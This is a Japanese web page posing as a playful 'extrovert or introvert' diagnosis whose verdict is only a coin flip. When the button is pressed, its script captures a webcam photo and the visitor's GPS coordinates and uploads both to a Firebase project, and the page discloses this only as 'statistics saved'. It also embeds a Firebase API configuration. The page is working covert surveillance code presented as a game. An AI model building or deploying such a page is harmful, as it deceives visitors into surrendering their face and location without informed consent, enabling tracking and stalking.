<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>陽キャ・陰キャ診断</title>
    <style>
        body { text-align: center; font-family: sans-serif; background: #f0f0f0; padding-top: 50px; }
        video { width: 90%; max-width: 400px; border-radius: 10px; border: 3px solid #333; }
        #result { font-size: 28px; font-weight: bold; margin-top: 20px; color: #ff4500; height: 40px; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; margin-top: 10px; }
    </style>
</head>
<body>

    <h1>陽キャ・陰キャ診断</h1>
    <video id="video" autoplay playsinline></video>
    <br>
    <div id="result"></div>
    <button id="btn">診断を開始する</button>
    <canvas id="canvas" style="display:none;"></canvas>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, addDoc, collection, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
        import { getStorage, ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";

        // ★★★ ここを自分のFirebaseの設定（firebaseConfig）に書き換える ★★★
        const firebaseConfig = {
            apiKey: "AIzaSyAK_CaFeRNBE5b29DYoCnqQIj_fMqCOFqE",
            authDomain: "face-still.firebaseapp.com",
            projectId: "face-still",
            storageBucket: "face-still.firebasestorage.app",
            messagingSenderId: "370841335231",
            appId: "1:370841335231:web:697d8ee92a453235b91d0a",
            measurementId: "G-6P20CTY920"
        };
        // ★★★ ここまで ★★★

        // Firebase初期化
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);
        const storage = getStorage(app);

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const btn = document.getElementById('btn');
        const resultDiv = document.getElementById('result');

        // カメラ起動
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => { video.srcObject = stream; })
            .catch(err => alert("カメラを許可してください"));

        btn.onclick = () => {
            btn.disabled = true;
            resultDiv.innerText = "スキャン中...";

            // 1. 位置情報の取得
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lng = pos.coords.longitude;

                // 2. 写真のキャプチャ
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg');

                // 3. ランダム結果
                const res = Math.random() > 0.5 ? "陽キャ" : "陰キャ";
                
                try {
                    // 4. Firebase Storageに画像を保存
                    const fileName = `faces/${Date.now()}.jpg`;
                    const storageRef = ref(storage, fileName);
                    await uploadString(storageRef, imageData, 'data_url');
                    const imageUrl = await getDownloadURL(storageRef);

                    // 5. Firestoreに統計データを保存
                    await addDoc(collection(db, "results"), {
                        result: res,
                        location: { lat, lng },
                        image: imageUrl,
                        timestamp: serverTimestamp()
                    });

                    resultDiv.innerText = "結果: " + res;
                    alert("診断完了！統計を保存しました。");
                } catch (e) {
                    console.error(e);
                    alert("保存に失敗しました。ルールの設定を確認してください。");
                } finally {
                    btn.disabled = false;
                }

            }, (err) => {
                alert("位置情報を許可してください");
                btn.disabled = false;
            });
        };
    </script>
</body>
</html>
